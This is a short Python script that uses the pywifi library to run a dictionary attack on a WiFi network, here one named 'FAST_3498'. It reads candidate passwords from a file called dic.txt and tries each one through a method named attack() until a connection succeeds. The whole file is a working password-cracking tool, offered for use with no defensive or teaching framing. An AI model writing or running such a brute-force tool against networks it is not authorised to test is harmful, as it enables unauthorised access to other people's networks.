import pywifi
from pywifi import const
import time
import threading


class WiFi:
    def __init__(self, wifi_name, auth=const.AUTH_ALG_OPEN, cipher=const.CIPHER_TYPE_CCMP, akm=const.AKM_TYPE_WPA2PSK):
        self.iface = pywifi.PyWiFi().interfaces()[0]  # wifi接口
        self.iface.disconnect()
        self.profile = pywifi.Profile()
        self.wifi_name = wifi_name
        self.akm = akm
        self.cipher = cipher
        self.auth = auth
        self.__set_profiles()

    def __set_profiles(self):
        self.profile.ssid = self.wifi_name
        self.profile.auth = self.auth
        self.profile.cipher = self.cipher
        self.profile.akm.append(self.akm)  # 选择wifi加密方式  akm - AP的密钥管理类型

    def attack(self, wifi_pwd=const.CIPHER_TYPE_NONE):
        self.profile.key = wifi_pwd
        self.iface.remove_all_network_profiles()
        settings = self.iface.add_network_profile(self.profile)
        self.iface.connect(settings)
        time.sleep(2)
        if self.iface.status() == const.IFACE_CONNECTED:
            print("connect success with password : ", wifi_pwd)
            return True
        else:
            print('connect failed with password : ', wifi_pwd)
            return False
        # print(self.iface.status())


if __name__ == '__main__':
    wifi = WiFi('FAST_3498')
    with open('dic.txt', 'r') as f:
        while True:
            pwd = f.readline()
            if not pwd:
                break
            result = wifi.attack(pwd)
            if result:
                break
